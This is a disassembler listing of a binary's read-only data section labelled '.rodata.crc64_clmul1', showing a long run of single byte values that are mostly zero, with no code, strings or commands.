.rodata.crc64_clmul1:000000000000C732                 db    0
.rodata.crc64_clmul1:000000000000C733                 db    0
.rodata.crc64_clmul1:000000000000C734                 db    0
.rodata.crc64_clmul1:000000000000C735                 db    0
.rodata.crc64_clmul1:000000000000C736                 db    0
.rodata.crc64_clmul1:000000000000C737                 db    0
.rodata.crc64_clmul1:000000000000C738                 db  40h ; @
.rodata.crc64_clmul1:000000000000C739                 db    2
.rodata.crc64_clmul1:000000000000C73A                 db  20h
.rodata.crc64_clmul1:000000000000C73B                 db    0
.rodata.crc64_clmul1:000000000000C73C                 db    0
.rodata.crc64_clmul1:000000000000C73D                 db    0
.rodata.crc64_clmul1:000000000000C73E                 db    0
.rodata.crc64_clmul1:000000000000C73F                 db    0
.rodata.crc64_clmul1:000000000000C740                 db    1
.rodata.crc64_clmul1:000000000000C741                 db    0
.rodata.crc64_clmul1:000000000000C742                 db    0
.rodata.crc64_clmul1:000000000000C743                 db    0
.rodata.crc64_clmul1:000000000000C744                 db    0
.rodata.crc64_clmul1:000000000000C745                 db    0
.rodata.crc64_clmul1:000000000000C746                 db    0
.rodata.crc64_clmul1:000000000000C747                 db    0
.rodata.crc64_clmul1:000000000000C748                 db    0
.rodata.crc64_clmul1:000000000000C749                 db    2
.rodata.crc64_clmul1:000000000000C74A                 db    0
.rodata.crc64_clmul1:000000000000C74B                 db    0
.rodata.crc64_clmul1:000000000000C74C                 db    0
.rodata.crc64_clmul1:000000000000C74D                 db    0
.rodata.crc64_clmul1:000000000000C74E                 db    0
.rodata.crc64_clmul1:000000000000C74F                 db    0
.rodata.crc64_clmul1:000000000000C750                 db    1
.rodata.crc64_clmul1:000000000000C751                 db    0
.rodata.crc64_clmul1:000000000000C752                 db    0
.rodata.crc64_clmul1:000000000000C753                 db    0
.rodata.crc64_clmul1:000000000000C754                 db    0
.rodata.crc64_clmul1:000000000000C755                 db    0
.rodata.crc64_clmul1:000000000000C756                 db    0
.rodata.crc64_clmul1:000000000000C757                 db    0
.rodata.crc64_clmul1:000000000000C758                 db    0
.rodata.crc64_clmul1:000000000000C759                 db    0
.rodata.crc64_clmul1:000000000000C75A                 db  40h ; @
.rodata.crc64_clmul1:000000000000C75B                 db    0
.rodata.crc64_clmul1:000000000000C75C                 db    0
.rodata.crc64_clmul1:000000000000C75D                 db    0
.rodata.crc64_clmul1:000000000000C75E                 db    0
.rodata.crc64_clmul1:000000000000C75F                 db    0
.rodata.crc64_clmul1:000000000000C760                 db    0
.rodata.crc64_clmul1:000000000000C761                 db    0
.rodata.crc64_clmul1:000000000000C762                 db    0
.rodata.crc64_clmul1:000000000000C763                 db    0
.rodata.crc64_clmul1:000000000000C764                 db    0
.rodata.crc64_clmul1:000000000000C765                 db    0
.rodata.crc64_clmul1:000000000000C766                 db    0
.rodata.crc64_clmul1:000000000000C767                 db    0
.rodata.crc64_clmul1:000000000000C768                 db    0
.rodata.crc64_clmul1:000000000000C769                 db    0
.rodata.crc64_clmul1:000000000000C76A                 db    0
.rodata.crc64_clmul1:000000000000C76B                 db    0
.rodata.crc64_clmul1:000000000000C76C                 db  20h
.rodata.crc64_clmul1:000000000000C76D                 db    2
.rodata.crc64_clmul1:000000000000C76E                 db    0
.rodata.crc64_clmul1:000000000000C76F                 db    0
.rodata.crc64_clmul1:000000000000C770                 db    0
.rodata.crc64_clmul1:000000000000C771                 db    0
.rodata.crc64_clmul1:000000000000C772                 db    0
.rodata.crc64_clmul1:000000000000C773                 db    0
.rodata.crc64_clmul1:000000000000C774                 db    0
.rodata.crc64_clmul1:000000000000C775                 db    0
.rodata.crc64_clmul1:000000000000C776                 db    0
.rodata.crc64_clmul1:000000000000C777                 db    0
.rodata.crc64_clmul1:000000000000C778                 db  10h
.rodata.crc64_clmul1:000000000000C779                 db    0
.rodata.crc64_clmul1:000000000000C77A                 db    0
.rodata.crc64_clmul1:000000000000C77B                 db    0
.rodata.crc64_clmul1:000000000000C77C                 db    0
.rodata.crc64_clmul1:000000000000C77D                 db    0
.rodata.crc64_clmul1:000000000000C77E                 db    0
.rodata.crc64_clmul1:000000000000C77F                 db    0
.rodata.crc64_clmul1:000000000000C780                 db    0
.rodata.crc64_clmul1:000000000000C781                 db    0
.rodata.crc64_clmul1:000000000000C782                 db    0
.rodata.crc64_clmul1:000000000000C783                 db    0
.rodata.crc64_clmul1:000000000000C784                 db    0
.rodata.crc64_clmul1:000000000000C785                 db    0
.rodata.crc64_clmul1:000000000000C786                 db    2
.rodata.crc64_clmul1:000000000000C787                 db    0
.rodata.crc64_clmul1:000000000000C788                 db    0
.rodata.crc64_clmul1:000000000000C789                 db    0
.rodata.crc64_clmul1:000000000000C78A                 db    0
.rodata.crc64_clmul1:000000000000C78B                 db    0
.rodata.crc64_clmul1:000000000000C78C                 db    0
.rodata.crc64_clmul1:000000000000C78D                 db    0
.rodata.crc64_clmul1:000000000000C78E                 db    0
.rodata.crc64_clmul1:000000000000C78F                 db    0
.rodata.crc64_clmul1:000000000000C790                 db    0
.rodata.crc64_clmul1:000000000000C791                 db    0
.rodata.crc64_clmul1:000000000000C792                 db    0
.rodata.crc64_clmul1:000000000000C793                 db    0
.rodata.crc64_clmul1:000000000000C794                 db    0
.rodata.crc64_clmul1:000000000000C795                 db    0
.rodata.crc64_clmul1:000000000000C796                 db    0
.rodata.crc64_clmul1:000000000000C797                 db    0
.rodata.crc64_clmul1:000000000000C798                 db    0
.rodata.crc64_clmul1:000000000000C799                 db    0
.rodata.crc64_clmul1:000000000000C79A                 db    0
.rodata.crc64_clmul1:000000000000C79B                 db    0
.rodata.crc64_clmul1:000000000000C79C                 db  40h ; @
.rodata.crc64_clmul1:000000000000C79D                 db  40h ; @
.rodata.crc64_clmul1:000000000000C79E                 db    8
.rodata.crc64_clmul1:000000000000C79F                 db    0
.rodata.crc64_clmul1:000000000000C7A0                 db    0
.rodata.crc64_clmul1:000000000000C7A1                 db    0
.rodata.crc64_clmul1:000000000000C7A2                 db    0
.rodata.crc64_clmul1:000000000000C7A3                 db    0
.rodata.crc64_clmul1:000000000000C7A4                 db    0
.rodata.crc64_clmul1:000000000000C7A5                 db    0
.rodata.crc64_clmul1:000000000000C7A6                 db    0
.rodata.crc64_clmul1:000000000000C7A7                 db    0
.rodata.crc64_clmul1:000000000000C7A8                 db    0
.rodata.crc64_clmul1:000000000000C7A9                 db    8
.rodata.crc64_clmul1:000000000000C7AA                 db    0
.rodata.crc64_clmul1:000000000000C7AB                 db    0
.rodata.crc64_clmul1:000000000000C7AC                 db    0
.rodata.crc64_clmul1:000000000000C7AD                 db    0
.rodata.crc64_clmul1:000000000000C7AE                 db    0
.rodata.crc64_clmul1:000000000000C7AF                 db    0
.rodata.crc64_clmul1:000000000000C7B0                 db    0
.rodata.crc64_clmul1:000000000000C7B1                 db    0
.rodata.crc64_clmul1:000000000000C7B2                 db    0
.rodata.crc64_clmul1:000000000000C7B3                 db    0
.rodata.crc64_clmul1:000000000000C7B4                 db    0
.rodata.crc64_clmul1:000000000000C7B5                 db    0
.rodata.crc64_clmul1:000000000000C7B6                 db  40h ; @
.rodata.crc64_clmul1:000000000000C7B7                 db    0
.rodata.crc64_clmul1:000000000000C7B8                 db    0
.rodata.crc64_clmul1:000000000000C7B9                 db    0
.rodata.crc64_clmul1:000000000000C7BA                 db    0
.rodata.crc64_clmul1:000000000000C7BB                 db    0
.rodata.crc64_clmul1:000000000000C7BC                 db    0
.rodata.crc64_clmul1:000000000000C7BD                 db    0
.rodata.crc64_clmul1:000000000000C7BE                 db    0
.rodata.crc64_clmul1:000000000000C7BF                 db    0
.rodata.crc64_clmul1:000000000000C7C0                 db    0
.rodata.crc64_clmul1:000000000000C7C1                 db    0
.rodata.crc64_clmul1:000000000000C7C2                 db    0
.rodata.crc64_clmul1:000000000000C7C3                 db    0
.rodata.crc64_clmul1:000000000000C7C4                 db    0
.rodata.crc64_clmul1:000000000000C7C5                 db    0
.rodata.crc64_clmul1:000000000000C7C6                 db  20h
.rodata.crc64_clmul1:000000000000C7C7                 db    0
.rodata.crc64_clmul1:000000000000C7C8                 db    0
.rodata.crc64_clmul1:000000000000C7C9                 db    0
.rodata.crc64_clmul1:000000000000C7CA                 db    0
.rodata.crc64_clmul1:000000000000C7CB                 db    0
.rodata.crc64_clmul1:000000000000C7CC                 db    0
.rodata.crc64_clmul1:000000000000C7CD                 db    0
.rodata.crc64_clmul1:000000000000C7CE                 db    0
.rodata.crc64_clmul1:000000000000C7CF                 db    0
.rodata.crc64_clmul1:000000000000C7D0                 db    0
.rodata.crc64_clmul1:000000000000C7D1                 db    0
.rodata.crc64_clmul1:000000000000C7D2                 db    0
.rodata.crc64_clmul1:000000000000C7D3                 db    0
.rodata.crc64_clmul1:000000000000C7D4                 db    0
.rodata.crc64_clmul1:000000000000C7D5                 db    0
.rodata.crc64_clmul1:000000000000C7D6                 db    0
.rodata.crc64_clmul1:000000000000C7D7                 db    0
.rodata.crc64_clmul1:000000000000C7D8                 db    0
.rodata.crc64_clmul1:000000000000C7D9                 db    0
.rodata.crc64_clmul1:000000000000C7DA                 db    0
.rodata.crc64_clmul1:000000000000C7DB                 db    0
.rodata.crc64_clmul1:000000000000C7DC                 db    0
.rodata.crc64_clmul1:000000000000C7DD                 db  21h ; !
.rodata.crc64_clmul1:000000000000C7DE                 db    0
.rodata.crc64_clmul1:000000000000C7DF                 db    0
.rodata.crc64_clmul1:000000000000C7E0                 db    0
.rodata.crc64_clmul1:000000000000C7E1                 db    0
.rodata.crc64_clmul1:000000000000C7E2                 db    0
.rodata.crc64_clmul1:000000000000C7E3                 db    0
.rodata.crc64_clmul1:000000000000C7E4                 db    0
.rodata.crc64_clmul1:000000000000C7E5                 db    0
.rodata.crc64_clmul1:000000000000C7E6                 db    0
.rodata.crc64_clmul1:000000000000C7E7                 db    0
.rodata.crc64_clmul1:000000000000C7E8                 db  18h
.rodata.crc64_clmul1:000000000000C7E9                 db  20h
.rodata.crc64_clmul1:000000000000C7EA                 db    1
.rodata.crc64_clmul1:000000000000C7EB                 db    0
.rodata.crc64_clmul1:000000000000C7EC                 db    8
.rodata.crc64_clmul1:000000000000C7ED                 db    0
.rodata.crc64_clmul1:000000000000C7EE                 db    8
.rodata.crc64_clmul1:000000000000C7EF                 db    0
.rodata.crc64_clmul1:000000000000C7F0                 db    0
.rodata.crc64_clmul1:000000000000C7F1                 db    0
.rodata.crc64_clmul1:000000000000C7F2                 db    0
.rodata.crc64_clmul1:000000000000C7F3                 db    0
.rodata.crc64_clmul1:000000000000C7F4                 db    0
.rodata.crc64_clmul1:000000000000C7F5                 db    0
.rodata.crc64_clmul1:000000000000C7F6                 db    0
.rodata.crc64_clmul1:000000000000C7F7                 db    0
.rodata.crc64_clmul1:000000000000C7F8                 db    8
.rodata.crc64_clmul1:000000000000C7F9                 db    0
.rodata.crc64_clmul1:000000000000C7FA                 db  40h ; @
.rodata.crc64_clmul1:000000000000C7FB                 db    0
.rodata.crc64_clmul1:000000000000C7FC                 db    0
.rodata.crc64_clmul1:000000000000C7FD                 db    0
.rodata.crc64_clmul1:000000000000C7FE                 db    0
.rodata.crc64_clmul1:000000000000C7FF                 db    0
.rodata.crc64_clmul1:000000000000C800                 db    0
.rodata.crc64_clmul1:000000000000C801                 db    0
.rodata.crc64_clmul1:000000000000C802                 db    0
.rodata.crc64_clmul1:000000000000C803                 db    0
.rodata.crc64_clmul1:000000000000C804                 db    0
.rodata.crc64_clmul1:000000000000C805                 db    0
.rodata.crc64_clmul1:000000000000C806                 db    0
.rodata.crc64_clmul1:000000000000C807                 db    0
.rodata.crc64_clmul1:000000000000C808                 db    4
.rodata.crc64_clmul1:000000000000C809                 db    0
.rodata.crc64_clmul1:000000000000C80A                 db    0
.rodata.crc64_clmul1:000000000000C80B                 db    0
.rodata.crc64_clmul1:000000000000C80C                 db    0
.rodata.crc64_clmul1:000000000000C80D                 db    0
.rodata.crc64_clmul1:000000000000C80E                 db    0
.rodata.crc64_clmul1:000000000000C80F                 db    0
.rodata.crc64_clmul1:000000000000C810                 db    0
.rodata.crc64_clmul1:000000000000C811                 db    0
.rodata.crc64_clmul1:000000000000C812                 db    0
.rodata.crc64_clmul1:000000000000C813                 db    0
.rodata.crc64_clmul1:000000000000C814                 db    0
.rodata.crc64_clmul1:000000000000C815                 db    0
.rodata.crc64_clmul1:000000000000C816                 db    0
.rodata.crc64_clmul1:000000000000C817                 db  10h
.rodata.crc64_clmul1:000000000000C818                 db    0
.rodata.crc64_clmul1:000000000000C819                 db    0
.rodata.crc64_clmul1:000000000000C81A                 db    0
.rodata.crc64_clmul1:000000000000C81B                 db    0
.rodata.crc64_clmul1:000000000000C81C                 db    0
.rodata.crc64_clmul1:000000000000C81D                 db    0
.rodata.crc64_clmul1:000000000000C81E                 db    0
.rodata.crc64_clmul1:000000000000C81F                 db    0
.rodata.crc64_clmul1:000000000000C820                 db    0
.rodata.crc64_clmul1:000000000000C821                 db    0
.rodata.crc64_clmul1:000000000000C822                 db    0
.rodata.crc64_clmul1:000000000000C823                 db    0
.rodata.crc64_clmul1:000000000000C824                 db    0
.rodata.crc64_clmul1:000000000000C825                 db    0
.rodata.crc64_clmul1:000000000000C826                 db    0
.rodata.crc64_clmul1:000000000000C827                 db    0
.rodata.crc64_clmul1:000000000000C828                 db    0
.rodata.crc64_clmul1:000000000000C829                 db    2
.rodata.crc64_clmul1:000000000000C82A                 db    4
.rodata.crc64_clmul1:000000000000C82B                 db    0
.rodata.crc64_clmul1:000000000000C82C                 db    0
.rodata.crc64_clmul1:000000000000C82D                 db    0
.rodata.crc64_clmul1:000000000000C82E                 db    0
.rodata.crc64_clmul1:000000000000C82F                 db    0
.rodata.crc64_clmul1:000000000000C830                 db    0
.rodata.crc64_clmul1:000000000000C831                 db    0
.rodata.crc64_clmul1:000000000000C832                 db    0
.rodata.crc64_clmul1:000000000000C833                 db    0
.rodata.crc64_clmul1:000000000000C834                 db    0
.rodata.crc64_clmul1:000000000000C835                 db    0
.rodata.crc64_clmul1:000000000000C836                 db    0
.rodata.crc64_clmul1:000000000000C837                 db    0
.rodata.crc64_clmul1:000000000000C838                 db    0
.rodata.crc64_clmul1:000000000000C839                 db  20h
.rodata.crc64_clmul1:000000000000C83A                 db    0
.rodata.crc64_clmul1:000000000000C83B                 db    0
.rodata.crc64_clmul1:000000000000C83C                 db    0
.rodata.crc64_clmul1:000000000000C83D                 db    0
.rodata.crc64_clmul1:000000000000C83E                 db    0
.rodata.crc64_clmul1:000000000000C83F                 db    0
.rodata.crc64_clmul1:000000000000C840                 db    0
.rodata.crc64_clmul1:000000000000C841                 db    0
.rodata.crc64_clmul1:000000000000C842                 db    0
.rodata.crc64_clmul1:000000000000C843                 db    0
.rodata.crc64_clmul1:000000000000C844                 db    0
.rodata.crc64_clmul1:000000000000C845                 db    0
.rodata.crc64_clmul1:000000000000C846                 db    0
.rodata.crc64_clmul1:000000000000C847                 db    0
.rodata.crc64_clmul1:000000000000C848                 db    0
.rodata.crc64_clmul1:000000000000C849                 db    0
.rodata.crc64_clmul1:000000000000C84A                 db  20h
.rodata.crc64_clmul1:000000000000C84B                 db    0
.rodata.crc64_clmul1:000000000000C84C                 db    0
.rodata.crc64_clmul1:000000000000C84D                 db    0
.rodata.crc64_clmul1:000000000000C84E                 db    0
.rodata.crc64_clmul1:000000000000C84F                 db    0
.rodata.crc64_clmul1:000000000000C850                 db    0
.rodata.crc64_clmul1:000000000000C851                 db    0
.rodata.crc64_clmul1:000000000000C852                 db    0
.rodata.crc64_clmul1:000000000000C853                 db    0
.rodata.crc64_clmul1:000000000000C854                 db    0
.rodata.crc64_clmul1:000000000000C855                 db    0
.rodata.crc64_clmul1:000000000000C856                 db    0
.rodata.crc64_clmul1:000000000000C857                 db    0
.rodata.crc64_clmul1:000000000000C858                 db  80h
.rodata.crc64_clmul1:000000000000C859                 db    0
.rodata.crc64_clmul1:000000000000C85A                 db    0
.rodata.crc64_clmul1:000000000000C85B                 db    0
.rodata.crc64_clmul1:000000000000C85C                 db    0
.rodata.crc64_clmul1:000000000000C85D                 db    0
.rodata.crc64_clmul1:000000000000C85E                 db    0
.rodata.crc64_clmul1:000000000000C85F                 db    0
.rodata.crc64_clmul1:000000000000C860                 db    0
.rodata.crc64_clmul1:000000000000C861                 db    0
.rodata.crc64_clmul1:000000000000C862                 db    0
.rodata.crc64_clmul1:000000000000C863                 db    0
.rodata.crc64_clmul1:000000000000C864                 db    0
.rodata.crc64_clmul1:000000000000C865                 db    0
.rodata.crc64_clmul1:000000000000C866                 db    0
.rodata.crc64_clmul1:000000000000C867                 db    0
.rodata.crc64_clmul1:000000000000C868                 db  40h ; @
.rodata.crc64_clmul1:000000000000C869                 db    0
.rodata.crc64_clmul1:000000000000C86A                 db    0
.rodata.crc64_clmul1:000000000000C86B                 db    0
.rodata.crc64_clmul1:000000000000C86C                 db    0
.rodata.crc64_clmul1:000000000000C86D                 db    0
.rodata.crc64_clmul1:000000000000C86E                 db    0
.rodata.crc64_clmul1:000000000000C86F                 db    0
.rodata.crc64_clmul1:000000000000C870 unk_C870        db    0
.rodata.crc64_clmul1:000000000000C871                 db    0
.rodata.crc64_clmul1:000000000000C872                 db    0
.rodata.crc64_clmul1:000000000000C873                 db    0
.rodata.crc64_clmul1:000000000000C874                 db    0
.rodata.crc64_clmul1:000000000000C875                 db    0
.rodata.crc64_clmul1:000000000000C876                 db    0
.rodata.crc64_clmul1:000000000000C877                 db    0
.rodata.crc64_clmul1:000000000000C878                 db  16h
.rodata.crc64_clmul1:000000000000C879                 db    0
.rodata.crc64_clmul1:000000000000C87A                 db  21h ; !
.rodata.crc64_clmul1:000000000000C87B                 db    0
.rodata.crc64_clmul1:000000000000C87C                 db    0
.rodata.crc64_clmul1:000000000000C87D                 db    0
.rodata.crc64_clmul1:000000000000C87E                 db    0
.rodata.crc64_clmul1:000000000000C87F                 db    0
.rodata.crc64_clmul1:000000000000C880                 db    0
.rodata.crc64_clmul1:000000000000C881                 db    0
.rodata.crc64_clmul1:000000000000C882                 db    0
.rodata.crc64_clmul1:000000000000C883                 db    0
.rodata.crc64_clmul1:000000000000C884                 db    0
.rodata.crc64_clmul1:000000000000C885                 db    0
.rodata.crc64_clmul1:000000000000C886                 db    0
.rodata.crc64_clmul1:000000000000C887                 db    0
.rodata.crc64_clmul1:000000000000C888                 db  10h
.rodata.crc64_clmul1:000000000000C889                 db    2
.rodata.crc64_clmul1:000000000000C88A                 db    0
.rodata.crc64_clmul1:000000000000C88B                 db    0
.rodata.crc64_clmul1:000000000000C88C                 db    0
.rodata.crc64_clmul1:000000000000C88D                 db    0
.rodata.crc64_clmul1:000000000000C88E                 db    0
.rodata.crc64_clmul1:000000000000C88F                 db    0
.rodata.crc64_clmul1:000000000000C890                 db    0
.rodata.crc64_clmul1:000000000000C891                 db    0
.rodata.crc64_clmul1:000000000000C892                 db    0
.rodata.crc64_clmul1:000000000000C893                 db    0
.rodata.crc64_clmul1:000000000000C894                 db    0
.rodata.crc64_clmul1:000000000000C895                 db    0
.rodata.crc64_clmul1:000000000000C896                 db    0
.rodata.crc64_clmul1:000000000000C897                 db    0
.rodata.crc64_clmul1:000000000000C898                 db    0
.rodata.crc64_clmul1:000000000000C899                 db    0
.rodata.crc64_clmul1:000000000000C89A                 db    0
.rodata.crc64_clmul1:000000000000C89B                 db    0
.rodata.crc64_clmul1:000000000000C89C                 db 0C0h
.rodata.crc64_clmul1:000000000000C89D                 db  40h ; @
.rodata.crc64_clmul1:000000000000C89E                 db    9
.rodata.crc64_clmul1:000000000000C89F                 db    0
.rodata.crc64_clmul1:000000000000C8A0                 db    0
.rodata.crc64_clmul1:000000000000C8A1                 db    0
.rodata.crc64_clmul1:000000000000C8A2                 db    0
.rodata.crc64_clmul1:000000000000C8A3                 db    0
.rodata.crc64_clmul1:000000000000C8A4                 db    0
.rodata.crc64_clmul1:000000000000C8A5                 db  20h
.rodata.crc64_clmul1:000000000000C8A6                 db    0
.rodata.crc64_clmul1:000000000000C8A7                 db    0
.rodata.crc64_clmul1:000000000000C8A8                 db    0
.rodata.crc64_clmul1:000000000000C8A9                 db    0
.rodata.crc64_clmul1:000000000000C8AA                 db    0
.rodata.crc64_clmul1:000000000000C8AB                 db    0
.rodata.crc64_clmul1:000000000000C8AC                 db    0
.rodata.crc64_clmul1:000000000000C8AD                 db    0
.rodata.crc64_clmul1:000000000000C8AE                 db    0
.rodata.crc64_clmul1:000000000000C8AF                 db    0
.rodata.crc64_clmul1:000000000000C8B0                 db    0
.rodata.crc64_clmul1:000000000000C8B1                 db    0
.rodata.crc64_clmul1:000000000000C8B2                 db    0
.rodata.crc64_clmul1:000000000000C8B3                 db    0
.rodata.crc64_clmul1:000000000000C8B4                 db    0
.rodata.crc64_clmul1:000000000000C8B5                 db    0
.rodata.crc64_clmul1:000000000000C8B6                 db    0
.rodata.crc64_clmul1:000000000000C8B7                 db    0
.rodata.crc64_clmul1:000000000000C8B8                 db    0
.rodata.crc64_clmul1:000000000000C8B9                 db    0
.rodata.crc64_clmul1:000000000000C8BA                 db    0
.rodata.crc64_clmul1:000000000000C8BB                 db    0
.rodata.crc64_clmul1:000000000000C8BC                 db    0
.rodata.crc64_clmul1:000000000000C8BD                 db    0
.rodata.crc64_clmul1:000000000000C8BE                 db  40h ; @
.rodata.crc64_clmul1:000000000000C8BF                 db    0
.rodata.crc64_clmul1:000000000000C8C0                 db    0
.rodata.crc64_clmul1:000000000000C8C1                 db    0
.rodata.crc64_clmul1:000000000000C8C2                 db    0
.rodata.crc64_clmul1:000000000000C8C3                 db    0
.rodata.crc64_clmul1:000000000000C8C4                 db    0
.rodata.crc64_clmul1:000000000000C8C5                 db    0
.rodata.crc64_clmul1:000000000000C8C6                 db    0
.rodata.crc64_clmul1:000000000000C8C7                 db    0
.rodata.crc64_clmul1:000000000000C8C8                 db    0
.rodata.crc64_clmul1:000000000000C8C9                 db    0
.rodata.crc64_clmul1:000000000000C8CA                 db    0
.rodata.crc64_clmul1:000000000000C8CB                 db    0
.rodata.crc64_clmul1:000000000000C8CC                 db    0
.rodata.crc64_clmul1:000000000000C8CD                 db    0
.rodata.crc64_clmul1:000000000000C8CE                 db    0
.rodata.crc64_clmul1:000000000000C8CF                 db    4
.rodata.crc64_clmul1:000000000000C8D0                 db    0
.rodata.crc64_clmul1:000000000000C8D1                 db    0
.rodata.crc64_clmul1:000000000000C8D2                 db    0
.rodata.crc64_clmul1:000000000000C8D3                 db    0
.rodata.crc64_clmul1:000000000000C8D4                 db    0
.rodata.crc64_clmul1:000000000000C8D5                 db    0
.rodata.crc64_clmul1:000000000000C8D6                 db    0
.rodata.crc64_clmul1:000000000000C8D7                 db    0
.rodata.crc64_clmul1:000000000000C8D8                 db    0
.rodata.crc64_clmul1:000000000000C8D9                 db    0
.rodata.crc64_clmul1:000000000000C8DA                 db    0
.rodata.crc64_clmul1:000000000000C8DB                 db    0
.rodata.crc64_clmul1:000000000000C8DC                 db    8
.rodata.crc64_clmul1:000000000000C8DD                 db    0
.rodata.crc64_clmul1:000000000000C8DE                 db    4
.rodata.crc64_clmul1:000000000000C8DF                 db    0
.rodata.crc64_clmul1:000000000000C8E0                 db    0
.rodata.crc64_clmul1:000000000000C8E1                 db    0
.rodata.crc64_clmul1:000000000000C8E2                 db    0
.rodata.crc64_clmul1:000000000000C8E3                 db    0
.rodata.crc64_clmul1:000000000000C8E4                 db    0
.rodata.crc64_clmul1:000000000000C8E5                 db    0
.rodata.crc64_clmul1:000000000000C8E6                 db    0
.rodata.crc64_clmul1:000000000000C8E7                 db    0
.rodata.crc64_clmul1:000000000000C8E8                 db    0
.rodata.crc64_clmul1:000000000000C8E9                 db    0
.rodata.crc64_clmul1:000000000000C8EA                 db    0
.rodata.crc64_clmul1:000000000000C8EB                 db    0
.rodata.crc64_clmul1:000000000000C8EC                 db  20h
.rodata.crc64_clmul1:000000000000C8ED                 db  10h
.rodata.crc64_clmul1:000000000000C8EE                 db    0
.rodata.crc64_clmul1:000000000000C8EF                 db    0
.rodata.crc64_clmul1:000000000000C8F0                 db    0
.rodata.crc64_clmul1:000000000000C8F1                 db    0
.rodata.crc64_clmul1:000000000000C8F2                 db    0
.rodata.crc64_clmul1:000000000000C8F3                 db    0
.rodata.crc64_clmul1:000000000000C8F4                 db    0
.rodata.crc64_clmul1:000000000000C8F5                 db    0
.rodata.crc64_clmul1:000000000000C8F6                 db    0
.rodata.crc64_clmul1:000000000000C8F7                 db    0
.rodata.crc64_clmul1:000000000000C8F8                 db    0
.rodata.crc64_clmul1:000000000000C8F9                 db    0
.rodata.crc64_clmul1:000000000000C8FA                 db    0
.rodata.crc64_clmul1:000000000000C8FB                 db    0
.rodata.crc64_clmul1:000000000000C8FC                 db    0
.rodata.crc64_clmul1:000000000000C8FD                 db    0
.rodata.crc64_clmul1:000000000000C8FE                 db    9
.rodata.crc64_clmul1:000000000000C8FF                 db    0
.rodata.crc64_clmul1:000000000000C900                 db    1
.rodata.crc64_clmul1:000000000000C901                 db    0
.rodata.crc64_clmul1:000000000000C902                 db    0
.rodata.crc64_clmul1:000000000000C903                 db    0
.rodata.crc64_clmul1:000000000000C904                 db    0
.rodata.crc64_clmul1:000000000000C905                 db    0
.rodata.crc64_clmul1:000000000000C906                 db    0
.rodata.crc64_clmul1:000000000000C907                 db    0
.rodata.crc64_clmul1:000000000000C908                 db    0
.rodata.crc64_clmul1:000000000000C909                 db    0
.rodata.crc64_clmul1:000000000000C90A                 db    0
.rodata.crc64_clmul1:000000000000C90B                 db  80h
.rodata.crc64_clmul1:000000000000C90C                 db    0
.rodata.crc64_clmul1:000000000000C90D                 db    0
.rodata.crc64_clmul1:000000000000C90E                 db    0
.rodata.crc64_clmul1:000000000000C90F                 db    0
.rodata.crc64_clmul1:000000000000C910                 db    0
.rodata.crc64_clmul1:000000000000C911                 db    0
.rodata.crc64_clmul1:000000000000C912                 db    0
.rodata.crc64_clmul1:000000000000C913                 db    0
.rodata.crc64_clmul1:000000000000C914                 db    0
.rodata.crc64_clmul1:000000000000C915                 db    0
.rodata.crc64_clmul1:000000000000C916                 db    0
.rodata.crc64_clmul1:000000000000C917                 db    0
.rodata.crc64_clmul1:000000000000C918                 db    0
.rodata.crc64_clmul1:000000000000C919                 db    0
.rodata.crc64_clmul1:000000000000C91A                 db    0
.rodata.crc64_clmul1:000000000000C91B                 db  80h
.rodata.crc64_clmul1:000000000000C91C                 db    0
.rodata.crc64_clmul1:000000000000C91D                 db    0
.rodata.crc64_clmul1:000000000000C91E                 db  10h
.rodata.crc64_clmul1:000000000000C91F                 db    0
.rodata.crc64_clmul1:000000000000C920                 db    0
.rodata.crc64_clmul1:000000000000C921                 db    0
.rodata.crc64_clmul1:000000000000C922                 db    0
.rodata.crc64_clmul1:000000000000C923                 db    0
.rodata.crc64_clmul1:000000000000C924                 db    0
.rodata.crc64_clmul1:000000000000C925                 db    0
.rodata.crc64_clmul1:000000000000C926                 db    0
.rodata.crc64_clmul1:000000000000C927                 db    0
.rodata.crc64_clmul1:000000000000C928                 db    0
.rodata.crc64_clmul1:000000000000C929                 db    0
.rodata.crc64_clmul1:000000000000C92A                 db    0
.rodata.crc64_clmul1:000000000000C92B                 db  80h
.rodata.crc64_clmul1:000000000000C92C                 db  30h ; 0
.rodata.crc64_clmul1:000000000000C92D                 db    0
.rodata.crc64_clmul1:000000000000C92E                 db    4
.rodata.crc64_clmul1:000000000000C92F                 db    0
.rodata.crc64_clmul1:000000000000C930                 db    0
.rodata.crc64_clmul1:000000000000C931                 db    0
.rodata.crc64_clmul1:000000000000C932                 db    0
.rodata.crc64_clmul1:000000000000C933                 db    0
.rodata.crc64_clmul1:000000000000C934                 db    0
.rodata.crc64_clmul1:000000000000C935                 db    0
.rodata.crc64_clmul1:000000000000C936                 db    0
.rodata.crc64_clmul1:000000000000C937                 db    0
.rodata.crc64_clmul1:000000000000C938                 db    0
.rodata.crc64_clmul1:000000000000C939                 db    0
.rodata.crc64_clmul1:000000000000C93A                 db    0
.rodata.crc64_clmul1:000000000000C93B                 db  80h
.rodata.crc64_clmul1:000000000000C93C                 db  20h
.rodata.crc64_clmul1:000000000000C93D                 db    0
.rodata.crc64_clmul1:000000000000C93E                 db    0
.rodata.crc64_clmul1:000000000000C93F                 db    0
.rodata.crc64_clmul1:000000000000C940                 db    0
.rodata.crc64_clmul1:000000000000C941                 db    0
.rodata.crc64_clmul1:000000000000C942                 db    0
.rodata.crc64_clmul1:000000000000C943                 db    0
.rodata.crc64_clmul1:000000000000C944                 db    0
.rodata.crc64_clmul1:000000000000C945                 db  40h ; @
.rodata.crc64_clmul1:000000000000C946                 db    0
.rodata.crc64_clmul1:000000000000C947                 db    0
.rodata.crc64_clmul1:000000000000C948                 db    0
.rodata.crc64_clmul1:000000000000C949                 db    0
.rodata.crc64_clmul1:000000000000C94A                 db    0
.rodata.crc64_clmul1:000000000000C94B                 db    0
.rodata.crc64_clmul1:000000000000C94C                 db    0
.rodata.crc64_clmul1:000000000000C94D                 db    0
.rodata.crc64_clmul1:000000000000C94E                 db    4
.rodata.crc64_clmul1:000000000000C94F                 db    0
.rodata.crc64_clmul1:000000000000C950                 db    0
.rodata.crc64_clmul1:000000000000C951                 db    0
.rodata.crc64_clmul1:000000000000C952                 db    0
.rodata.crc64_clmul1:000000000000C953                 db    0
.rodata.crc64_clmul1:000000000000C954                 db    0
.rodata.crc64_clmul1:000000000000C955                 db    0
.rodata.crc64_clmul1:000000000000C956                 db    0
.rodata.crc64_clmul1:000000000000C957                 db    0
.rodata.crc64_clmul1:000000000000C958                 db    0
.rodata.crc64_clmul1:000000000000C959                 db    0
.rodata.crc64_clmul1:000000000000C95A                 db    0
